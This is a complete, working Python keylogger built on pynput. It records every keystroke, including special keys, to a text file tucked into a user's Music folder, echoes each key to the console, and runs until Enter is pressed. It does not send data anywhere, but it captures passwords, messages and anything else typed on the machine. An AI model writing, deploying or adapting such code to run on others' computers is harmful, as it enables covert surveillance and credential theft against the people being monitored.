from pynput import keyboard

def keyPressed(key):
    try:
        # If the key is an alphanumeric key, log it as it is
        char = key.char
        with open(r"c:\Users\USER.DESKTOP-FP7LCVQ.000\Music\new\keylog.txt", 'a') as logkey:
            logkey.write(char)
        print(f"Alphanumeric key pressed: {char}")
    except AttributeError:
        # Handle special keys (non-alphanumeric)
        with open(r"c:\Users\USER.DESKTOP-FP7LCVQ.000\Music\new\keylog.txt", 'a') as logkey:
            logkey.write(f"<{key}>")
        print(f"Special key pressed: {key}")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    
    # Keep the program running
    input("Press Enter to stop the listener...\n")
